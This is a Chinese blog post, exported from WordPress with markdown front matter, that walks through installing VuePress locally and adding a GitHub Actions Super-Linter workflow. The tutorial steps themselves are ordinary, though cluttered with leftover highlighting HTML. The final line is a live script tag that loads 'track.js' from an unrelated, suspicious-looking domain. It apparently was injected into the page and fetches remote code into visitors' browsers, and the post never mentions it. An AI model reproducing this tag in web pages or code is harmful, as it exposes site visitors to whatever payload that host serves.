---
id: 112
title: vuepress搭建的博客结合github里的Action自动发布到github上
date: '2021-01-14T17:43:09+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=112'
permalink: /index.php/2021/01/14/vuepress%e6%90%ad%e5%bb%ba%e7%9a%84%e5%8d%9a%e5%ae%a2%e7%bb%93%e5%90%88github%e9%87%8c%e7%9a%84action%e8%87%aa%e5%8a%a8%e5%8f%91%e5%b8%83%e5%88%b0github%e4%b8%8a/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - others
---

一、vuepress搭建本地博客

1. 创建并进入一个新目录 <div class="language-bash extra-class">```
  <pre class="language-bash">```
  <span class="token function">mkdir</span> vuepress-starter <span class="token operator">&&</span> <span class="token builtin class-name">cd</span> vuepress-starter
  
  ```
  ```
  
  </div>
2. 使用你喜欢的包管理器进行初始化 <div class="language-bash extra-class">```
  <pre class="language-bash">```
  <span class="token function">yarn</span> init <span class="token comment"># npm init</span>
  
  ```
  ```
  
  </div>
3. 将 VuePress 安装为本地依赖我们已经不再推荐全局安装 VuePress <div class="language-bash extra-class">```
  <pre class="language-bash">```
  <span class="token function">yarn</span> <span class="token function">add</span> -D vuepress <span class="token comment"># npm install -D vuepress</span>
  
  ```
  ```
  
  </div><div class="warning custom-block">注意
  
  如果你的现有项目依赖了 webpack 3.x，我们推荐使用 [Yarn <span class="sr-only">(opens new window)</span>](https://classic.yarnpkg.com/zh-Hans/)而不是 npm 来安装 VuePress。因为在这种情形下，npm 会生成错误的依赖树。
  
  </div>
4. 创建你的第一篇文档 <div class="language-bash extra-class">```
  <pre class="language-bash">```
  <span class="token function">mkdir</span> docs <span class="token operator">&&</span> <span class="token builtin class-name">echo</span> <span class="token string">'# Hello VuePress'</span> <span class="token operator">></span> docs/README.md
  
  ```
  ```
  
  </div>
5. 在 `package.json` 中添加一些 [scripts<span class="sr-only">(opens new window)</span>](https://classic.yarnpkg.com/zh-Hans/docs/package-json#toc-scripts)这一步骤是可选的，但我们推荐你完成它。在下文中，我们会默认这些 scripts 已经被添加。 <div class="language-json extra-class">```
  <pre class="language-json">```
  <span class="token punctuation">{</span>
    <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token property">"dev"</span><span class="token operator">:</span> <span class="token string">"vuepress dev docs"</span><span class="token punctuation">,</span>
      <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"vuepress build docs"</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  
  ```
  ```
  
  </div>
6. 在本地启动服务器 <div class="language-bash extra-class">```
  <pre class="language-bash">```
  <span class="token function">yarn</span> docs:dev <span class="token comment"># npm run docs:dev</span>
  
  ```
  ```
  
  </div>VuePress 会在 [http://localhost:8080 <span class="sr-only">(opens new window)</span>](http://localhost:8080/)启动一个热重载的开发服务器。
  
  二、利用github上的Actions添加工作流
  
  
  - 从 GitHub 上的仓库，在 `.github/workflow` 目录中创建一个名为 `superlinter.yml` 的新文件。 更多信息请参阅“[创建新文件](https://docs.github.com/cn/free-pro-team@latest/github/managing-files-in-a-repository/creating-new-files)”。
  - 将以下 YAML 内容复制到 `superlinter.yml` 文件中。 **注：** 如果您的默认分支不是 `main`，请更新 `DEFAULT_BRANCH` 的值以匹配您仓库的默认分支名称。 <div class="code-extra"><header class="d-flex flex-items-center flex-justify-between p-2 text-small rounded-top-1 border">YAML<button aria-label="Copy code to clipboard" class="js-btn-copy btn btn-sm tooltipped tooltipped-nw" data-clipboard-text="name: Super-Linter # Run this workflow every time a new commit pushed to your repository on: push jobs: # Set the job key. The key is displayed as the job name # when a job name is not provided super-lint: # Name the Job name: Lint code base # Set the type of machine to run on runs-on: ubuntu-latest steps: # Checks out a copy of your repository on the ubuntu-latest machine - name: Checkout code uses: actions/checkout@v2 # Runs the Super-Linter action - name: Run Super-Linter uses: github/super-linter@v3 env: DEFAULT_BRANCH: main GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"></button></header>```yaml
      <span class="hljs-attr">name:</span> <span class="hljs-string">Super-Linter</span>
      
      <span class="hljs-comment"># Run this workflow every time a new commit pushed to your repository</span>
      <span class="hljs-attr">on:</span> <span class="hljs-string">push</span>
      
      <span class="hljs-attr">jobs:</span>
        <span class="hljs-comment"># Set the job key. The key is displayed as the job name</span>
        <span class="hljs-comment"># when a job name is not provided</span>
        <span class="hljs-attr">super-lint:</span>
          <span class="hljs-comment"># Name the Job</span>
          <span class="hljs-attr">name:</span> <span class="hljs-string">Lint</span> <span class="hljs-string">code</span> <span class="hljs-string">base</span>
          <span class="hljs-comment"># Set the type of machine to run on</span>
          <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
      
          <span class="hljs-attr">steps:</span>
            <span class="hljs-comment"># Checks out a copy of your repository on the ubuntu-latest machine</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span> <span class="hljs-string">code</span>
              <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span>
      
            <span class="hljs-comment"># Runs the Super-Linter action</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">Super-Linter</span>
              <span class="hljs-attr">uses:</span> <span class="hljs-string">github/super-linter@v3</span>
              <span class="hljs-attr">env:</span>
                <span class="hljs-attr">DEFAULT_BRANCH:</span> <span class="hljs-string">main</span>
                <span class="hljs-attr">GITHUB_TOKEN:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.GITHUB_TOKEN</span> <span class="hljs-string">}}</span>
      ```
      
      </div>
  - 要运行您的工作流程， 滚动到页面底部，然后选择 **为此提交创建一个新分支并开始拉取请求**。 然后，若要创建拉取请求，请单击 **Propose new file（提议新文件）**。 <div class="procedural-image-wrapper">![提交工作流程文件](https://docs.github.com/assets/images/commit-workflow-file.png)</div>
7. 在仓库中提交工作流程文件会触发 `push` 事件并运行工作流程。  
  ### [查看工作流程结果](https://docs.github.com/cn/free-pro-team@latest/actions/quickstart#%E6%9F%A5%E7%9C%8B%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E7%BB%93%E6%9E%9C)
  
  
  1. 1. 在 GitHub 上，导航到仓库的主页面。
      2. 在仓库名称下，单击 **Actions（操作）**。 <div class="procedural-image-wrapper">![主仓库导航中的操作选项卡](https://docs.github.com/assets/images/help/repository/actions-tab.png)</div>
      3. 在左侧边栏中，单击您想要查看的工作流程。 <div class="procedural-image-wrapper">![左侧边栏中的工作流程列表](https://docs.github.com/assets/images/help/repository/superlinter-workflow-sidebar.png)</div>
      4. 从工作流程运行列表中，单击要查看的运行的名称。 <div class="procedural-image-wrapper">![工作流程运行的名称](https://docs.github.com/assets/images/help/repository/superlinter-run-name.png)</div>
      5. 在 **Jobs（作业）**下或可视化图中，单击 **Lint code base（Lint 代码基础）**作业。 <div class="procedural-image-wrapper">![Lint 代码库作业](https://docs.github.com/assets/images/help/repository/superlinter-lint-code-base-job-updated.png)</div>
      6. 任何失败的步骤都会自动展开以显示结果。 <div class="procedural-image-wrapper">![Super linter 工作流程结果](https://docs.github.com/assets/images/help/repository/super-linter-workflow-results-updated-2.png)</div>

<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>